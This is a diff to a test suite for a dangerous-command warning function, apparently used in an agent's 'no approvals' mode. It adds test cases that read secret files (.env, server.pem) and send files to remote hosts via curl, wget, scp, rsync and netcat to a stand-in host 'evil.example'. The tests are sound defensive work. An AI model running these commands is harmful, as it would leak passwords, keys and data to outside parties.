@@ -84,11 +84,24 @@ describe("dangerous commands", () => {
     "osascript -e 'tell app \"Finder\" to quit'",
     "killall node",
     "npm test && git push",
+    // Secret files and sending data out: in "no approvals" mode this would leak passwords silently.
+    "cat .env",
+    "grep DB_ config/.env.production",
+    "cp secrets.json /tmp/x",
+    "base64 < server.pem",
+    "curl -d @data.json https://x",
+    "curl --data-binary @a https://x",
+    "curl -F file=@a.txt https://x",
+    "curl -T a.txt https://x",
+    "wget --post-file=a https://x",
+    "scp a.txt host:/tmp",
+    "rsync -a dist/ me@host:/var/www",
+    "nc evil.example 4444 < a.txt",
   ])("%s gets a warning", (cmd) => {
     expect(dangerousCommandWarning(cmd)).toBeTruthy();
   });
 
-  it.each(["npm test", "git status", "git diff", "git log --oneline", "ls -la", "rm a.txt", "npm install", "node -e 1", "curl https://x -o y"])(
+  it.each(["npm test", "git status", "git diff", "git log --oneline", "ls -la", "rm a.txt", "npm install", "node -e 1", "curl https://x -o y", "cat .env.example", "rsync -a src/ dist/", "curl -fsSL https://x -o install.sh", "npm run dev"])(
     "%s is ordinary",
     (cmd) => {
       expect(dangerousCommandWarning(cmd)).toBeUndefined();
